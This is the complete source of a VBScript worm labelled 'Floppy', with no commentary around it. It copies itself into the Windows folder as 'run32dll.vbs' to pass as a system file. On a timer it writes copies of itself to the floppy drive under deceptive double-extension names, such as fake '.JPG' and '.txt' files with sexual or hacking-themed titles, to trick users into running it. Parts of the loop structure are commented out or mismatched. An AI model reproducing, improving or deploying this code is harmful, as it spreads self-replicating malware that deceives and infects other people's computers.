'do'
' Floppy
On error resume next
randomize
set fso=createobject("scripting.filesystemobject")
set wscriptshell=createobject("wscript.shell")
set drives=fso.drives
for each drive in drives
if drive="C:" then
if drive.isready then
drivefull=drive & "\"
set e5d=fso.getfolder(drivefull)
set subs=e5d.subfolders
for each subfolder in subs
subst=mid(subfolder.path,4,3)
if subst="WIN" then
auto=subfolder.path
end if
next
end if
end if
next
autos=auto & "\run32dll.vbs"
fso.copyfile wscript.scriptfullname,autos
tim=minute(time)
tim=tim+6
set thiscode=fso.opentextfile(wscript.scriptfullname,1)
code=thiscode.readall
thiscode.close
timstandard=minute(time)
if tim>53 then
tim=01
end if
if timstandard=tim then
tim=minute(time)
tim=tim+6
trig=int((10*rnd)+1)
select case trig
case 1
floppya="a:\Mpc.txt.txt.vbs"
case 2
floppya="a:\JLO's ASS.gip.jpg.vbs"
case 3
floppya="a:\How2Hack.txt.vbs"
case 4
floppya="a:\Ziimac's Pic.JPG.vbs"
case 5
floppya="a:\Me and JLOJPG.vbs"
case 6
floppya="a:\SPIDERMAN_LIVES.txt.vbs"
case 7
floppya="a:\HACKING_WINDOWS.TXT.vbs"
case 8
floppya="a:\5 hoes.JPG.vbs"
case 9
floppya="a:\Sexy momma.gip.vbs"
case else
floppya="a:\MELINDA'S @$$.JPG.vbs"
end select
set repla=fso.createtextfile(floppya,true)
repla.write code
repla.close
set repla=nothing
floppya=""
'loop'
End if

